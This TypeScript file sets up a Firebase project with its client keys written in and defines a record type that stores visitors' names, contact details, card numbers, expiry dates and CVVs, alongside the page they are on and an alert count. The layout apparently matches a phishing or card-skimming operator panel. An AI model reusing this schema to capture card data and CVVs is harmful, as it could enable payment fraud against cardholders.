import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
   apiKey: "AIzaSyD7Kd6-a3M2eD_yuZbbcxEJXslU2RsWJQk",
  authDomain: "rfiod-acd4d.firebaseapp.com",
  projectId: "rfiod-acd4d",
  storageBucket: "rfiod-acd4d.firebasestorage.app",
  messagingSenderId: "552489166840",
  appId: "1:552489166840:web:200a39c746c843f5b0d80d",
  measurementId: "G-BFX7D5ESW4"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
